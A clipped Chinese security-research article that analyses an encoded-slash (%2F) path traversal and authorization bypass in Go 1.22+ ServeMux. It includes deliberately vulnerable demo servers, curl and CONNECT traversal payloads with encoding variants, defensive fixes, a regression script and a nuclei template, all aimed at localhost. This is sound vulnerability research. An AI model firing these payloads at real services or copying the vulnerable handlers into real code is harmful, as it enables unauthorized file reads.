---
title: 【先知】编码斜杠击穿 Go 路由器：ServeMux 双视图解析与路径穿越
source: https://xz.aliyun.com/news/92894
source_host: xz.aliyun.com
clip_date: 2026-09-29T16:32:33+08:00
trace_id: 88f38ddf-b1d8-423c-83df-19ae3ef228d8
content_hash: cf829a64d2c5fb3e20bfec9cd39d191e6ea94a690a8127ad078e1f854904355e
status: synced
tags:
  - 先知
  - 漏洞分析
  - 开发工具
series: null
feed_source: 先知安全技术社区
ai_summary: Go 1.22 起 ServeMux 匹配按编码视图（EscapedPath）切段、命中后通配值按解码视图交付，编码斜杠 `%2F` 因此能在授权前缀放行后演变为越出根的路径穿越。
ai_summary_style: key-points
images_status:
  total: 38
  succeeded: 38
  failed_urls: []
notion_page_id: 3ea75244-d011-8180-81d5-fe30ac8dc0ca
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Go 1.22 起 ServeMux 匹配按编码视图（EscapedPath）切段、命中后通配值按解码视图交付，编码斜杠 `%2F` 因此能在授权前缀放行后演变为越出根的路径穿越。
> 
> - **根因：** 同一请求存在两套路径视图——`EscapedPath()` 用于匹配（`%2F` 不是段分隔符），`Path`/`PathValue` 用于交付（已解码，`..` 回退语义恢复）；`/files/..%2Fsecret.txt` 在匹配层是一段，命中 `/files/{name}` 后交付 `../secret.txt`。
> - **版本差异：** Go 1.21 及更早对解码后的 `r.URL.Path` 做 `cleanPath` 并返回 301 折叠，穿越在匹配层被阻断；1.22+ 改为对 `EscapedPath()` 做 `cleanPath`（server.go 2679 行），`%2F` 不被识别，目录前缀返回 307 补斜杠且载荷原样保留。
> - **关键实测：** `/admin%2F` 的 `Path` 已是 `/admin/` 却匹配失败落根；`%2e` 编码点段不被折叠（`cleanPath` 只认明文 `.`/`..`）；CONNECT 跳过 `cleanPath`，可作绕过折叠的对照窗口。
> - **定位手段：** `GODEBUG=httpmuxgo121=1` 能让同一二进制切回 1.21 匹配语义，处理器代码不改即关闭穿越面，证明问题出在匹配层而非业务写法。
> - **防御要点：** 匹配、授权、交付必须用同一份视图；拼接磁盘路径前 `filepath.Clean` 并断言仍在根目录内；入口拒绝 `%2F`/`%5C`（含大小写、双重编码）；优先 `http.FileServer`+`http.Dir` 或 `fs.ValidPath`；前缀授权只作粗筛。附 regression.sh（探测到穿越返回退出码 1）与 nuclei 模板。

> Go 1.22 起 `net/http.ServeMux` 的路由匹配改用编码视图（ `EscapedPath` ）逐段比较， `%2F` 不再是段分隔符；匹配命中后通配捕获值按解码视图交付，`..` 回退语义恢复。授权中间件按解码路径前缀放行，处理器拼接磁盘路径时越出前缀——同一请求在两份视图里各被信任一次。

**实验环境**

|     |     |
| --- | --- | 
| 项   | 值   |
| 系统  | Kali 2026.1 |
| Go  | 1.26.8（go-1.26）与 1.21.13（go1.21.13/bin/go） |
| Nginx | 1.28.3 |
| 服务  | muxdump:8101、filesrv:8110、muxold:8111、filesrv_old:8112、split_view:8114、godebug_demo:8120、authz:8086、pathall:8113、nginx:8106 |
| 测试文件 | /srvfiles/welcome.txt（PUBLIC_FILE_OK）、/secret.txt（TRAVERSAL_SECRET） |

## 1 双路径字段：URL 解析为何存在两个"路径"

`net/url.Parse` 的结果里同时存在 `Path` 与 `RawPath` 两个字段。 `Path` 是百分号解码后的路径，不做路径规整； `RawPath` 仅在编码形态与默认转义结果不一致时被设置，用于保留原始转义序列（ `net/url/url.go` 的 `setPath` ）。ServeMux 匹配读取的是 `EscapedPath()` （存在 `RawPath` 时即返回 `RawPath` 本身）， `RequestURI` 始终保留客户端发送的原始编码形态。

编码斜杠 `%2F` 因此在两条管线上呈现两种含义：

-   **匹配视图**：ServeMux 按 `EscapedPath()` 切段， `%2F` 不是段分隔符， `/files/..%2Fsecret.txt` 在匹配层是两段 `[files, ..%2Fsecret.txt]` ，单段通配 `/files/{name}` 命中后逐段解码；
-   **交付视图**：通配捕获值 `PathValue("name")` 按解码视图交付为 `../secret.txt` ，处理器拼接磁盘路径时 `..` 回退语义恢复； `r.URL.Path` 同样持有解码形态。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eabb7453ebfd74d5.png)

## 2 匹配发生在编码视图还是解码视图？

### 2.1 CONNECT 方法：绕过 cleanPath 折叠的对照窗口

`findHandler` 对 CONNECT 请求跳过路径规整（ `net/http/server.go` 2663-2675：注释"CONNECT requests are not canonicalized"），不调用 `cleanPath` ，但仍取 `r.URL.EscapedPath()` 做逐段匹配、逐段解码。因此 CONNECT 与 GET 共享同一条编码视图匹配管线，穿越链路不依赖方法；差别只在折叠： `GET /admin/.` 会被 `cleanPath` 折叠并 307 重定向，CONNECT 原样进入匹配。

在 muxdump（8101）上发原始 CONNECT 请求：

```bash
printf '%s\r\n%s\r\n\r\n' 'CONNECT /files/..%2Fsecret.txt:80 HTTP/1.1' 'Host: 127.0.0.1:8101' | nc -q 1 127.0.0.1 8101
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/41d8306a5762d215.png)

CONNECT 不经过 `cleanPath` ，也不触发补斜杠重定向（2663-2675 分支），但编码视图匹配与逐段解码与 GET 完全一致—— `%2F` 在 CONNECT 里同样不是段分隔符，`../secret.txt` 照样以解码形态交付。这说明双视图分裂是 `findHandler` 匹配管线的通用属性，不是某个方法的特例；同时给出一个绕过 `cleanPath` 折叠的观察窗口（明文 `..` 段在 GET 会被折叠，CONNECT 不会）。

### 2.2 从 301 折叠到 307 补斜杠：%2F 语义的版本变迁

对 `GET /files/..%2Fsecret.txt` ，新旧版本行为差别显著：

-   **Go 1.21 及更早**： `findHandler` 先取解码后的 `r.URL.Path` 做 `cleanPath` 折叠（ `net/http/servemux121.go` 121 行 `path := cleanPath(r.URL.Path)` ），命中后返回 301 重定向（126、132 行 `StatusMovedPermanently` ），把用户引到规整后的路径，编码斜杠的穿越面被折叠逻辑"顺手关掉"；
-   **Go 1.22+**： `findHandler` 对 `EscapedPath()` 做 `cleanPath` （ `server.go` 2679 行）， `%2F` 不是Clean 的识别对象，穿越段原样保留；对无尾斜杠的目录前缀返回 307 补斜杠（2684 行 `StatusTemporaryRedirect` ）， `%2F` 原样保留在请求中，穿越载荷得以继续向处理器传递。

> `golang/go#21955` 是旧版 301 折叠行为对应的历史 issue 锚点，真正的问题面在 Go 1.22 新语义与文件类处理器解码时机错配。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bfc0458b44a54cf8.png)

## 3 编码斜杠在实机上的完整链路

### 3.1 muxdump：最简复现服务

muxdump.go：

```go
package main

import (
    "fmt"
    "log"
    "net/http"
)

func dump(w http.ResponseWriter, r *http.Request) {
    pat := r.Pattern                      // 命中的 pattern
    name := r.PathValue("name")           // 通配捕获值，已解码
    fmt.Fprintf(w, "HIT [%s] name=%q Path=%q RawPath=%q EscapedPath=%q\n",
        pat, name, r.URL.Path, r.URL.RawPath, r.URL.EscapedPath())
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/admin/{$}", dump)    // 精确匹配 /admin
    mux.HandleFunc("/admin/", dump)       // 前缀匹配 /admin/
    mux.HandleFunc("/files/{name}", dump) // 单段通配
    mux.HandleFunc("/debug", dump)
    mux.HandleFunc("/", dump)             // 兜底根
    log.Fatal(http.ListenAndServe("127.0.0.1:8101", mux))
}
```

启动：

```bash
go run muxdump.go
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3595803a01e0add0.png)

```bash
curl -i 'http://127.0.0.1:8101/admin'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d3a520b7699827f8.png)

常规目录请求：新版返回 307 补斜杠。

```bash
curl -i 'http://127.0.0.1:8101/admin%2F'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5fde73cccc1e7361.png)

编码斜杠伪目录：匹配跳过 /admin/ 前缀，落根。

```bash
curl -i 'http://127.0.0.1:8101/admin%2Fpanel'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/120539cab296cc05.png)

编码斜杠内联：Path 解码为 /admin/panel，匹配层仍按编码视图落根。

```bash
curl -i 'http://127.0.0.1:8101/files/welcome.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fc1d99c7de9edba4.png)

前缀内正常文件：单段通配捕获。

```bash
curl -i 'http://127.0.0.1:8101/files/..%2Fsecret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dc6b7551e2aa79c6.png) 编码斜杠穿越：命中 /files/{name} 且 name 含..

```bash
curl -i 'http://127.0.0.1:8101/files/a%2Fb'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/697d9c969f18b25e.png)

编码段嵌入： `name` 交付解码后的 `a/b` 。

```bash
curl -i --path-as-is 'http://127.0.0.1:8101/files/.%2e/secret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e8a5b1e2a2646aee.png)

`.%2e` 解码为..，编码视图不折叠，3 段超出 `/files/{name}` 匹配，落根。

```bash
curl -i --path-as-is 'http://127.0.0.1:8101/%2e%2e/secret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b616a897d2cf2089.png)

`%2e%2e` 解码为..，编码视图不折叠，落根。

`/admin%2F` 是整条链路最直接的分裂证据—— `Path` 解码为 `/admin/` ，但 ServeMux 的匹配保留编码视图， `%2F` 未被视为目录分隔符，前缀 `/admin/` 匹配失败； `/files/..%2Fsecret.txt` 则命中单段通配并把 `../secret.txt` 解码交付给处理器。注意 7/8 两条：编码点段（ `%2e` 形态）在匹配层不被折叠—— `cleanPath` 只识别明文 `.`/`..` 段，对百分号编码无感——`..` 原样出现在交付字段；折叠仅作用于明文点段（如 `/admin/.` 会触发 307，见 2.2 的 2679 行 `cleanPath` 逻辑）。

### 3.2 filesrv：交付视图拼接磁盘路径

filesrv ：

```go
package main

import (
    "fmt"
    "log"
    "net/http"
    "os"
    "path/filepath"
)

const root = "/home/nl/srvfiles" // welcome.txt 放此，secret.txt 放上级目录

func serve(w http.ResponseWriter, r *http.Request) {
    name := r.PathValue("name")    // 解码后的捕获值，含 ../ 原样交付
    p := filepath.Join(root, name) // 路径拼接，归一 ..
    data, err := os.ReadFile(p)
    if err != nil {
        fmt.Fprintf(w, "ERR(404) name=%q path=%s err=%v\n", name, p, err)
        return
    }
    fmt.Fprintf(w, "OK(200) name=%q path=%s body=%s\n", name, p, data)
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/files/{name}", serve)
    log.Fatal(http.ListenAndServe("127.0.0.1:8110", mux))
}
```

启动：

```bash
go run filesrv.go
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/79f585fc01fdbcae.png)

```bash
curl -i 'http://127.0.0.1:8110/files/welcome.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/642907c3e06d84ac.png)

正常读取：前缀内文件。

```bash
curl -i 'http://127.0.0.1:8110/files/..%2Fsecret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4b99653cb5cccd26.png)

编码斜杠穿越：解码后越出 /files/。

`%2F` 在编码视图里不是段分隔符， `/files/{name}` 的单段通配把整段 `..%2Fsecret.txt` 捕获， `PathValue` 解码后交付 `../secret.txt` ；处理器用这份解码值拼接磁盘路径， `filepath.Join` 的 `..` 语义恢复，越权读取成立。

### 3.3 muxold：旧工具链复现 301 折叠

Go 1.21 的 ServeMux 不支持 1.22 的模式通配语法，muxold.go 使用等价的 `/files/` 前缀写法：

```go
package main

import (
    "fmt"
    "log"
    "net/http"
)

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/admin/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "admin-prefix hit, Path=%q\n", r.URL.Path)
    })
    mux.HandleFunc("/files/", func(w http.ResponseWriter, r *http.Request) {
        name := r.URL.Path[len("/files/"):]
        fmt.Fprintf(w, "files-prefix hit, name=%q Path=%q RawPath=%q URI=%q\n",
            name, r.URL.Path, r.URL.RawPath, r.RequestURI)
    })
    mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "root hit, Path=%q\n", r.URL.Path)
    })
    log.Fatal(http.ListenAndServe("127.0.0.1:8111", mux))
}
```

编译与启动（用旧工具链）：

```bash
go run muxold.go
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2d217f18836a7060.png)

```bash
curl -i 'http://127.0.0.1:8111/files/welcome.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9f01a520679bf727.png)

前缀内正常文件：旧版可正常读取。

```bash
curl -i 'http://127.0.0.1:8111/files/..%2Fsecret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cbf1698da2d243e0.png)

编码斜杠穿越：旧版期望折叠。

旧版 `findHandler` 在匹配前对解码后的 `r.URL.Path` 做 `cleanPath` （ `servemux121.go` 121 行 `path := cleanPath(r.URL.Path)` ）， `%2F` 已被 `url.Parse` 解码为 `/` ，`..` 段随即被折叠并触发 301（126、132 行），穿越载荷在匹配层即被阻断，与 2.2 的版本变迁描述一致。

### 3.4 filesrv_old：旧工具链文件服务对照

filesrv_old.go 使用 1.21 兼容的前缀写法：

```go
package main

import (
    "log"
    "net/http"
    "os"
    "path/filepath"
)

const root = "/home/nl/srvfiles"

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/files/", func(w http.ResponseWriter, r *http.Request) {
        name := r.URL.Path[len("/files/"):]
        p := filepath.Join(root, name)
        b, err := os.ReadFile(p)
        if err != nil {
            http.Error(w, err.Error(), http.StatusNotFound)
            return
        }
        w.Write(b)
    })
    log.Fatal(http.ListenAndServe("127.0.0.1:8112", mux))
}
```

编译与启动（用旧工具链）：

```bash
go run filesrv_old.go
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d2f1a731c3b2d357.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7efcd92a3be57009.png)

前缀内正常文件：可读取。

```bash
curl -i 'http://127.0.0.1:8112/files/..%2Fsecret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b0adfa31721d9e5b.png)

编码斜杠穿越：旧版期望折叠后 301。

旧版文件服务同样在匹配层折叠 `..`， `%2F` 穿越链路不成立；穿越面是 Go 1.22 新 ServeMux 语义与"解码后交付"处理器组合的产物，而非文件读取逻辑本身的缺陷。

### 3.5 双视图切段：split_view 实证段数分裂

split_view：

```go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "strings"
)

func segs(p string) []string {
    p = strings.TrimPrefix(p, "/")
    if p == "" {
        return nil
    }
    return strings.Split(p, "/")
}

// decodedSegments 仅做 %XX 解码、不做 Clean，
// 用于暴露"匹配视图"与"交付视图"的段数差；
// r.URL.Path 即为解码形态（Parse 期不 Clean），这里与其保持一致。
func decodedSegments(p string) []string {
    d, err := url.PathUnescape(p)
    if err != nil {
        return nil
    }
    return segs(d)
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        esc := segs(r.URL.EscapedPath())
        dec := decodedSegments(r.URL.EscapedPath())
        fmt.Fprintf(w, "escaped=%q encoded_view_segments=%d %v\n", r.URL.EscapedPath(), len(esc), esc)
        fmt.Fprintf(w, "decoded=%q decoded_view_segments=%d %v\n", r.URL.Path, len(dec), dec)
    })
    http.ListenAndServe(":8114", mux)
}
```

启动：

```bash
go run split_view.go
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a329743438e43adb.png)

```bash
curl 'http://127.0.0.1:8114/..%2Fsecret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/650c4634f69d0aa7.png)

编码斜杠穿越：编码视图 1 段，解码视图 2 段。

```bash
curl 'http://127.0.0.1:8114/admin%2Fpanel'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8d12625eea505ff3.png)

编码斜杠内联：编码视图 1 段，解码视图 2 段，落根。

```bash
curl --path-as-is 'http://127.0.0.1:8114/.%2e/%2e%2e'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0c045d2332bdd5ea.png)

.%2e/%2e%2e 不被折叠，两段原样进入解码视图。

段数分裂是穿越的充分条件——同一载荷在编码视图里是 1 段，解码视图里是 2 段（`..` 回退语义恢复）。 `admin%2Fpanel` 更说明匹配层看的是编码视图： `%2F` 不被当作分隔符， `/admin/` 前缀因此失配。载荷 3 显示编码点段同样不被折叠： `%2e` 形态在 `cleanPath` 眼里不是明文 `.`/`..`，两段原样通过匹配，解码后 `..` 直接交付。

## 4 三次信任瓦解

把双视图分裂套进真实授权情境，信任在三个层面依次瓦解，每一层都以为自己看到的路径"足够权威"。

### 4.1 第一次瓦解：匹配层——前缀即授权

授权中间件最常见的写法是检查 `r.URL.Path` 是否以受保护前缀开头。 `/files/..%2Fsecret.txt` 的解码 `Path` 以 `/files/` 开头，前缀检查放行；ServeMux 的匹配层按编码视图切段（ `server.go` 2679 行 `cleanPath(r.URL.EscapedPath())` ， `%2F` 不是段分隔符），模式 `/files/{name}` 照样命中单段通配。匹配层用编码视图、授权层用解码视图，同一载荷在两份判断里各自成立——第一层信任瓦解。

### 4.2 第二次瓦解：补斜杠层——307 保留载荷

新版 ServeMux 对目录前缀返回 307（ `server.go` 2684 行 `StatusTemporaryRedirect` ）， `matchOrRedirect` 构造补斜杠 URL， `%2F` 原样保留，客户端跟随重定向后载荷不丢。旧版 301 折叠在这里是"隐性修复"：它在匹配前把 `..` 吃掉（ `servemux121.go` 121 行），载荷根本到不了处理器；新版 `cleanPath` 只作用于编码视图字符串（2679 行），对 `%2F` 无感，载荷完整送达——第二层信任瓦解。

### 4.3 第三次瓦解：交付层——解码后拼接

处理器按解码后的 `Path` / `PathValue` 重建相对路径并拼接磁盘路径，`..` 回退语义恢复（3.2 的 `filepath.Join` 实测）。三层各看各的视图，没有一层把"匹配时用编码视图、交付时用解码视图"的组合当作整体校验——第三层信任瓦解。

![串联三次瓦解的完整链路](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/230adba4b3413079.png)

### 4.4 GODEBUG 单二进制 A/B：httpmuxgo121 切换旧语义

`GODEBUG=httpmuxgo121=1` 是 Go 1.22 提供的兼容开关，可让新版 `net/http` 恢复 1.21 的 ServeMux 匹配语义。利用它可以在 **同一二进制** 上完成 A/B 对照，把问题精确定位到匹配层。

godebug_demo：

```go
package main

import (
    "fmt"
    "log"
    "net/http"
)

func dump(w http.ResponseWriter, r *http.Request) {
    name := r.PathValue("name")
    fmt.Fprintf(w, "HIT [%s] name=%q Path=%q EscapedPath=%q\n",
        r.Pattern, name, r.URL.Path, r.URL.EscapedPath())
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/files/{name}", dump)
    log.Fatal(http.ListenAndServe("127.0.0.1:8120", mux))
}
```

编译与 A/B 流程：

```bash
go build -o godebug_demo godebug_demo.go
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9af7316a8fda13c8.png)

```bash
#以后台方式启动
nohup ./godebug_demo >/tmp/godebug.log 2>&1 &
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0d35af9932cdd05e.png)

```bash
#执行 curl
curl -i 'http://127.0.0.1:8120/files/..%2Fsecret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f9498bd57ecbd723.png)

**先杀掉 A 段进程，再带开关重启**，否则 8120 被占、新进程起不来：

```bash
fuser -k 8120/tcp 2>/dev/null
GODEBUG=httpmuxgo121=1 nohup ./godebug_demo >/tmp/godebug121.log 2>&1 &
curl -i 'http://127.0.0.1:8120/files/..%2Fsecret.txt'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0f7e99f2ecbb962e.png)

处理器代码一行未改，仅靠 `GODEBUG=httpmuxgo121=1` 把匹配实现切回兼容层（1.22 起内置的 `servemux121.go` ），121 行的 `cleanPath` 折叠重新生效，穿越面即开即关。这证明根因在 ServeMux 的新匹配行为，而非示例处理器的写法。

### 4.5 authz：授权中间件按前缀放行的端到端旁路

authz.go：

```go
package main

import (
    "fmt"
    "log"
    "net/http"
    "strings"
)

func admin(w http.ResponseWriter, r *http.Request) {
    // 业务侧按解码 Path 前缀路由到管理功能
    if strings.HasPrefix(r.URL.Path, "/admin") {
        fmt.Fprintf(w, "ADMIN_SECRET [%s]\n", r.URL.Path)
        return
    }
    fmt.Fprintf(w, "PUBLIC [%s]\n", r.URL.Path)
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        // 中间件：编码视图精确校验，只拒绝字面 /admin
        if r.URL.EscapedPath() == "/admin" {
            http.Error(w, "AUTH_401", http.StatusUnauthorized)
            return
        }
        admin(w, r)
    })
    log.Fatal(http.ListenAndServe("127.0.0.1:8086", mux))
}
```

```bash
curl -i 'http://127.0.0.1:8086/admin'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a5ceaaceeff9f318.png)

字面 /admin：中间件精确拦截。

```bash
curl -i 'http://127.0.0.1:8086/admin%2F'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b74188c17f68557b.png)

/admin，放行。

```bash
curl -i 'http://127.0.0.1:8086/admin%2f'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9d3205bb9dd059b4.png)

编码斜杠小写变体：同样放行。

```bash
curl -i 'http://127.0.0.1:8086/admin%252F'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/90753367e09d53af.png)

双重编码：%252F 在 EscapedPath 中保留。

```bash
curl -i 'http://127.0.0.1:8086/admin%2e%2e'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f7173032af419da2.png)

%2e%2e 解码为..，业务前缀仍命中。

```bash
curl -i --path-as-is 'http://127.0.0.1:8086/admin/.'
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3cd9bc70e09a5690.png)

/admin/. 明文.. 折叠，307 重定向到 /admin。

最后这个请求的明文点段触发 `cleanPath` 折叠并 307 重定向到折叠后的 `/admin` （无尾斜杠即兜底 `/` 命中，未触发补斜杠），重定向后同样落入业务处理器——明文折叠不改变结果。授权校验看编码视图、业务路由看解码视图，两份视图互不校验——"编码视图即安全视图"的信任假设被打破。

## 5 防御

修复原则只有一条： **匹配、授权、交付必须基于同一份视图**，且文件读取前必须显式归一化路径：

1.  **文件服务内显式归一化**：拼接磁盘路径前先 `filepath.Clean` ，并断言结果仍在根目录内，前缀之外一律 404；
2.  **拒绝编码分隔符**：在入口中间件检查 `r.URL.RawPath` / `r.RequestURI` ，出现 `%2F` 、 `%5C` （含大小写变体）直接拒绝或规范化后重定向；
3.  **使用安全文件服务原语**： `http.FileServer` + `http.Dir` 自带路径校验；自研处理器时用 `fs.ValidPath` 或 `io/fs` 子文件系统约束；
4.  **统一视图**：授权中间件与处理器使用同一份解析结果，不要在中间件里用解码 `Path` 判断、在处理器里又用 `RequestURI` 重建路径；
5.  **监控 GODEBUG 兼容开关**： `httpmuxgo121` 会全局改变匹配语义，生产环境需审计谁在开、为什么开，避免"单服务降级拖垮整条链路"；
6.  **前缀授权只做粗筛**：敏感文件的授权不应依赖"路径在哪个前缀下"，改用显式资源 ID 或 token 绑定，路径只用于定位。

### 5.1 回归脚本：regression.sh

检测到穿越面时退出码 1：

```bash
#!/usr/bin/env bash
# 编码斜杠穿越回归检测：检测到穿越面时退出码 1
# 前置：muxdump 已监听 8101
set -u

BASE=http://127.0.0.1:8101
VULN=0

probe() {
  local desc="$1" expect="$2" url="$3"
  local body
  body=$(curl -s "$url")
  if echo "$body" | grep -q "$expect"; then
    echo "PASS: $desc"
  else
    echo "FAIL: $desc"
    VULN=1
  fi
}

# 1) 穿越面探测：name=../secret.txt 说明编码斜杠穿越成立
probe "encoded traversal leaks" 'name="../secret.txt"' "$BASE/files/..%2Fsecret.txt"
# 2) 编码段内联交付：name=a/b
probe "encoded segment delivered" 'name="a/b"' "$BASE/files/a%2Fb"
# 3) 编码斜杠伪目录落根：不命中 /admin/ 前缀
probe "encoded admin lands root" 'HIT [/]' "$BASE/admin%2F"

if [ "$VULN" -eq 1 ]; then
  echo "RESULT: VULNERABLE - encoded-slash traversal surface detected"
  exit 1
fi
echo "RESULT: CLEAN"
exit 0
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e1dccc14a44e98f7.png)

脚本把"编码视图段数分裂"固化为可执行的断言——只要 `..%2F` 还能以解码形态交付给处理器，CI 即失败，防止新代码或依赖升级把穿越面带回来。

### 5.2 nuclei 模板

可直接对目标 Go 服务批量探测：

```yaml
id: go-servemux-encoded-slash

info:
  name: Go ServeMux Encoded Slash Traversal
  author: nl
  severity: high
  description: |
    Go 1.22+ ServeMux 对 %2F 采用双视图解析，
    授权前缀放行后处理器可越权读取树外文件。
  tags: go,path-traversal,servemux

http:
  - method: GET
    path:
      - "{{BaseURL}}/files/..%2Fsecret.txt"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "TRAVERSAL_SECRET"
        part: body
      - type: status
        status:
          - 200
```

启动：

```bash
nuclei -t go-servemux-encoded-slash-nuclei.yaml -u http://127.0.0.1:8110
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fe204d082c1f7d19.png)

nuclei 把探测固化为可分发模板，覆盖 `%2F` 单编码形态；真实环境可扩展 `%252F` 双重编码与 `%5C` 变体，并按业务前缀替换 `/files/` 。

## 结论

编码斜杠击穿 Go 路由器的本质，是 Go 1.22 新 ServeMux 把匹配与交付拆成两条互不校验的管线：匹配层按编码视图（ `EscapedPath` ）切段， `%2F` 不是段分隔符；命中后通配捕获值按解码视图交付，`..` 回退语义恢复。三层信任（前缀授权、307 保留载荷、解码后拼接）叠加，构成一条无需认证即可越权读取文件的完整链路。修复不复杂——统一视图、显式归一化、拒绝编码分隔符——但任何一层单独加固都可能被其余两层绕过，必须整体收紧。
